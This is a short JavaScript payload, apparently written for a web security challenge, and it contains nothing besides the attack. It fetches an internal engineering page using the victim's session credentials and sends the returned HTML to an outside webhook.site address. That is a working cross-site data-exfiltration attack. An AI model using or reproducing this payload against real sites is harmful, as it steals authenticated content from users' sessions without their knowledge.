fetch('https://engineering.quoccacorp.com/', { credentials: 'include' })
  .then(r => r.text())
  .then(html => {
    fetch('https://webhook.site/a6ecea9b-2db7-48d5-9d18-86c6f8050304/?data=' + encodeURIComponent(html));
  });
